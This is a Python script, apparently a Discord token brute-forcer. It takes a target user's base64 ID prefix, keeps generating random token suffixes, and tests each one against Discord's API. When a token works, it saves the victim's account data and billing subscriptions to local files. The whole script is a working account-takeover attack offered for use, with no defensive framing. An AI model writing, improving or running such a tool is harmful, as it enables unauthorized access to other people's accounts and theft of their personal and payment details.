print("Installing/loading requirements...")

from scripts.miscellaneous import *
from scripts.get_input import *
from scripts.install import *

install_requirements(check_requirements())
from os import name, getcwd, system
from requests import Session
from colorama import Fore
from time import sleep
from rstr import xeger


def main() -> None:
    try:
        check_folders()
        if name == "nt":
            system("title DISCORD TOKEN CHECKER - Made by Venu2HD#1761")
        SETTINGS: dict = get_config()
        START_BASE64, TARGET_UUID = get_target(clear_screen)
        clear_screen()
        while True:
            full: str = f"{START_BASE64}.{'{}'}".format(
                xeger("^[A-Z]{1}([a-zA-Z0-9]){5}\.([a-zA-Z0-9_-]{38})$")
            )
            with Session() as session:
                response = session.get(
                    "http://discord.com/api/v9/users/@me",
                    headers={"authorization": full},
                )
                if response.status_code == 200:
                    billing_response = session.get(
                        "http://discordapp.com/api/v6/users/@me/billing/subscriptions",
                        headers={"authorization": full},
                    )
                    write_result(
                        TARGET_UUID, response.json(), billing_response.json(), full
                    )
                    clear_screen()
                    if name == "nt":
                        input(
                            f"{Fore.GREEN}TOKEN FOUND!\nResults written to:\n{getcwd()}\\{TARGET_UUID}.txt,\n{getcwd()}\\{TARGET_UUID}.json\n{Fore.WHITE}"
                        )
                    else:
                        input(
                            f"{Fore.GREEN}TOKEN FOUND!\nResults written to:\n{getcwd()}\\{TARGET_UUID}.txt,\n{getcwd()}/{TARGET_UUID}.json\n{Fore.WHITE}"
                        )
                    clear_screen()
                    exit()
                elif response.status_code == 401:
                    print(f"{Fore.RED}TESTED: {full}{Fore.WHITE}")
                else:
                    print(
                        f"{Fore.YELLOW}TIMEOUT FROM DISCORD API OR OTHER PROBLEM... WAITING {SETTINGS['timeout_in_seconds']}{Fore.WHITE}"
                    )
                    sleep(SETTINGS["timeout_in_seconds"])
    except KeyboardInterrupt:
        print("\n\n\nGOODBYE!")
        sleep(3)


if __name__ == "__main__":
    main()
